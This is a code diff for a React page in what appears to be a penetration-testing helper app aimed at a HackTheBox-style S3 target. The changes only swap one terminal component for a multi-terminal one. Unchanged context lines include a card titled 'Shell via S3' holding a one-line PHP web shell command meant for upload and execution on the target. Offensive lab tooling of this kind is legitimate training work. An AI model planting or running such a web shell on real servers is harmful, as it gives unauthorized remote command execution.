@@ -3,7 +3,7 @@ import { useJobs } from '../context/JobContext';
 import { useSocket } from '../context/SocketContext';
 import { InfoCard, CmdLine, SectionTitle } from '../components/InfoCard';
 import { sendCmd } from '../utils/helpers';
-import Terminal from '../components/Terminal';
+import MultiTerminal, { useMultiTerminalId } from '../components/MultiTerminal';
 
 export default function AwsPage({ onBack }) {
   const { activeJob, activeJobId } = useJobs();
@@ -11,7 +11,7 @@ export default function AwsPage({ onBack }) {
   const [endpoint, setEndpoint] = useState('http://s3.target.htb');
   const [tab, setTab] = useState('s3');
 
-  const termId = `aws-${activeJobId || 'default'}`;
+  const termId = useMultiTerminalId('aws');
 
   return (
     <div style={{ paddingBottom: 40 }}>
@@ -49,7 +49,7 @@ export default function AwsPage({ onBack }) {
             </button>
           </div>
 
-          <Terminal id={termId} title="AWS Terminal" height={240} />
+          <MultiTerminal prefix="aws" defaultTitle="AWS Terminal" />
 
           <SectionTitle icon="📋">S3 Komutları</SectionTitle>
           <InfoCard title="Temel S3 İşlemleri" icon="🪣" defaultOpen color="green">
@@ -73,7 +73,7 @@ export default function AwsPage({ onBack }) {
 
       {tab === 'configure' && (
         <>
-          <Terminal id={termId} title="AWS Terminal" height={240} />
+          <MultiTerminal prefix="aws" defaultTitle="AWS Terminal" />
           <SectionTitle icon="⚙">Yapılandırma</SectionTitle>
           <InfoCard title="aws configure – Hızlı Dummy Ayar" icon="⚙" defaultOpen color="cyan">
             <CmdLine cmd="aws configure" desc="Etkileşimli kurulum – aşağıdaki değerleri gir" termId={termId} />
@@ -99,7 +99,7 @@ EOF`} desc="Geçici credential dosyası oluştur" termId={termId} />
 
       {tab === 'shell' && (
         <>
-          <Terminal id={termId} title="AWS Terminal" height={240} />
+          <MultiTerminal prefix="aws" defaultTitle="AWS Terminal" />
           <InfoCard title="S3 Üzerinden Shell" icon="🐚" defaultOpen color="orange">
             <div className="cmd-desc">PHP shell'i S3'e yükle, web sunucusu üzerinden çalıştır:</div>
             <CmdLine cmd={`echo '<?php system($_GET["cmd"]); ?>' > shell.php`} desc="Shell oluştur" termId={termId} />
